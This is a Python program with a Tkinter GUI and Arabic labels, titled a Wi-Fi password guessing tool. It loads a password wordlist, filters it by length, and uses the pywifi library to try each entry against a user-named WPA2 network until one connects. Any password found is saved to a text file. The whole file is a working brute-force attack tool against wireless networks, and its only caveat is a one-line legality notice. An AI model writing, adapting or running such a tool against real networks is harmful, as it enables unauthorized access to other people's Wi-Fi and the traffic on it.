import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from pywifi import PyWiFi, const, Profile
import time
import threading

# وظيفة لتحميل ملف كلمات المرور
def load_password_file():
    filepath = filedialog.askopenfilename(
        title="اختر ملف كلمات المرور",
        filetypes=(("Text Files", "*.txt"), ("All Files", "*.*"))
    )
    if filepath:
        with open(filepath, "r") as file:
            passwords = file.read().splitlines()
        return passwords
    else:
        messagebox.showerror("خطأ", "لم يتم اختيار ملف")
        return None

# وظيفة لتصفية كلمات المرور
def filter_passwords(passwords, min_length=8, max_length=16):
    return [pwd for pwd in passwords if min_length <= len(pwd) <= max_length]

# وظيفة لتجربة كلمات المرور على شبكة Wi-Fi
def test_wifi_password(ssid, passwords, progress, stop_flag):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    total = len(passwords)
    for idx, password in enumerate(passwords):
        if stop_flag["stop"]:
            messagebox.showinfo("إيقاف", "تم إيقاف العملية من قبل المستخدم")
            return

        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(5)

        progress["value"] = (idx + 1) / total * 100

        if iface.status() == const.IFACE_CONNECTED:
            messagebox.showinfo("نجاح", f"كلمة المرور الصحيحة هي: {password}")
            iface.disconnect()

            # حفظ كلمة المرور الصحيحة
            with open("found_password.txt", "w") as f:
                f.write(f"SSID: {ssid}\nPassword: {password}")
            return password
    messagebox.showwarning("فشل", "لم يتم العثور على كلمة المرور الصحيحة")
    return None

# واجهة رسومية
def start_gui():
    def start_testing():
        ssid = ssid_entry.get()
        if not ssid:
            messagebox.showerror("خطأ", "يرجى إدخال اسم الشبكة (SSID)")
            return

        passwords = load_password_file()
        if passwords:
            passwords = filter_passwords(passwords)
            stop_flag["stop"] = False
            threading.Thread(
                target=test_wifi_password,
                args=(ssid, passwords, progress_bar, stop_flag),
                daemon=True
            ).start()

    def stop_testing():
        stop_flag["stop"] = True

    # إعداد النافذة
    root = tk.Tk()
    root.title("برنامج تخمين كلمات مرور Wi-Fi")

    tk.Label(root, text="أدخل اسم شبكة Wi-Fi (SSID):").pack(pady=5)
    ssid_entry = tk.Entry(root, width=30)
    ssid_entry.pack(pady=5)

    tk.Button(root, text="بدء الاختبار", command=start_testing).pack(pady=10)
    tk.Button(root, text="إيقاف الاختبار", command=stop_testing).pack(pady=5)

    progress_bar = ttk.Progressbar(root, orient="horizontal", length=300, mode="determinate")
    progress_bar.pack(pady=10)

    tk.Label(root, text="ملاحظة: استخدم هذه الأداة بشكل قانوني فقط.").pack(pady=10)

    root.mainloop()

# تشغيل البرنامج
if __name__ == "__main__":
    stop_flag = {"stop": False}
    start_gui()